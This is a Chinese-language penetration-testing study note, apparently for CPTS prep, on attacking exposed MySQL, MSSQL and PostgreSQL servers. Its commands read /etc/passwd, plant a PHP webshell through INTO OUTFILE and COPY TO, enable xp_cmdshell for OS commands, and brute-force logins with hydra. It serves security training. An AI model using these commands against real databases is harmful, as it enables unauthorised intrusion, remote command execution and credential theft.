# 第 50 章 - MySQL、MSSQL 與 PostgreSQL

## 標籤

- #cpts
- #chapter
- #mysql
- #mssql
- #postgresql
- #database

## 學習目標

- 理解對外暴露的資料庫服務的主要風險面與差異。
- 能用原生客戶端連線並執行基本枚舉查詢。
- 能從 MySQL 的 UDF / MSSQL 的 xp_cmdshell 取得命令執行。
- 能從資料庫版本、設定與憑證推導後續利用鏈。

---

## 理論基礎

```text
常見資料庫埠：
  MySQL      → 3306/tcp
  MSSQL      → 1433/tcp
  PostgreSQL → 5432/tcp

高價值攻擊面：
  1. 弱/預設憑證（root 空密碼、sa/sa）
  2. 版本對應已知 CVE
  3. 高權限帳號 → 命令執行（xp_cmdshell / UDF）
  4. 讀取敏感檔案（MySQL LOAD_FILE）
  5. 憑證回收（資料庫內存的應用帳號密碼）

MSSQL xp_cmdshell：
  sa 帳號（SQL Server sysadmin） → 啟用 xp_cmdshell → OS 命令執行

MySQL UDF（User Defined Function）：
  高版本需 secure-file-priv 為空才能寫入 plugin 目錄
  成功 → 執行 OS 命令（www-data 或 mysql 身分）
```

---

## 方法一：服務發現

```bash
# 掃描資料庫服務
nmap -sV -p 3306,1433,5432 TARGET_IP

# MySQL NSE 腳本
nmap --script mysql-info,mysql-databases,mysql-empty-password \
  -p 3306 TARGET_IP
# mysql-info          → 版本、capabilities
# mysql-databases     → 列出資料庫（需憑證）
# mysql-empty-password → 測試 root 空密碼

# MSSQL NSE 腳本
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password \
  -p 1433 TARGET_IP
# ms-sql-info         → 版本、instance 名稱
# ms-sql-empty-password → 測試空密碼

# PostgreSQL
nmap --script pgsql-brute -p 5432 TARGET_IP
# pgsql-brute → 暴力破解（預設試 postgres:postgres）
```

---

## 方法二：MySQL 枚舉與利用

```bash
# 連線 MySQL（需憑證）
mysql -h TARGET_IP -u root -p
# -h → 遠端主機
# -u → 使用者名稱
# -p → 提示輸入密碼

# 空密碼登入
mysql -h TARGET_IP -u root

# 連線後基本枚舉
SHOW databases;             -- 列出所有資料庫
USE mysql;                  -- 切換到 mysql 系統資料庫
SELECT user, host, authentication_string FROM user;  -- 看所有帳號與密碼 hash
SHOW grants FOR 'root'@'localhost';  -- 看 root 的權限

# 讀取本機檔案（需 FILE 權限且 secure_file_priv 允許）
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

# 寫入 WebShell（需 FILE 權限且目標目錄可寫）
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# 查 secure_file_priv 設定
SHOW VARIABLES LIKE 'secure_file_priv';
# 空字串 → 無限制（可讀寫任意路徑）
# /var/lib/mysql-files → 只允許此路徑
# NULL → 禁用所有 LOAD_FILE / INTO OUTFILE
```

---

## 方法三：MSSQL 枚舉與 xp_cmdshell

```bash
# 連線 MSSQL（Linux 工具）
mssqlclient.py sa:password@TARGET_IP
# Impacket 工具，支援 Windows 認證

# 或用 sqsh
sqsh -S TARGET_IP -U sa -P password

# 連線後枚舉
SELECT @@version;                      -- MSSQL 版本
SELECT name FROM master..sysdatabases; -- 列出所有資料庫
SELECT name FROM syslogins;            -- 列出登入帳號

# 啟用 xp_cmdshell
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# 執行 OS 命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -enc BASE64_ENCODED_COMMAND';

# 讀取檔案
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';

# 若 xp_cmdshell 被禁止，嘗試 OLE Automation
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
```

---

## 方法四：PostgreSQL 枚舉與利用

```bash
# 連線 PostgreSQL
psql -h TARGET_IP -U postgres -W
# -U postgres → 預設管理帳號

# 連線後枚舉
\l                          -- 列出所有資料庫
\du                         -- 列出所有使用者與權限
SELECT version();           -- 版本
SELECT current_user;        -- 目前使用者

# COPY 讀取本機檔案（需 superuser）
COPY passwords FROM '/etc/passwd';
SELECT * FROM passwords;

# 使用 COPY TO 寫入 WebShell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

---

## 方法五：暴力破解

```bash
# hydra MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  mysql://TARGET_IP

# hydra MSSQL
hydra -l sa -P /usr/share/wordlists/rockyou.txt \
  mssql://TARGET_IP

# hydra PostgreSQL
hydra -l postgres -P /usr/share/wordlists/rockyou.txt \
  postgres://TARGET_IP

# Metasploit 掃描模組
# use auxiliary/scanner/mssql/mssql_login
# use auxiliary/scanner/mysql/mysql_login
```

---

## 決策流程

```
nmap -p 3306/1433/5432 確認資料庫服務
    ↓
NSE 腳本（empty-password / info）
    ↓
有憑證？
  → 是：連線 → 枚舉版本/帳號/資料庫
           → MSSQL：xp_cmdshell OS 命令執行
           → MySQL：LOAD_FILE / INTO OUTFILE
           → PostgreSQL：COPY 讀/寫檔
  → 否：hydra 暴力破解
    ↓
從資料庫內容找應用密碼 → 橫向移動
```

---

## 速查表

```bash
# MySQL
mysql -h TARGET_IP -u root -p
SHOW databases; SELECT LOAD_FILE('/etc/passwd');

# MSSQL
mssqlclient.py sa:pass@TARGET_IP
EXEC xp_cmdshell 'whoami';

# PostgreSQL
psql -h TARGET_IP -U postgres
\l; SELECT version();

# 暴力破解
hydra -l root -P rockyou.txt mysql://TARGET_IP
hydra -l sa -P rockyou.txt mssql://TARGET_IP
```

---

## 關聯筆記

- [[38-SQL注入|第 38 章 - SQL 注入]]
- [[05-Volume-5-Common-Services-Index|Vol.5 - Attacking Common Services]]
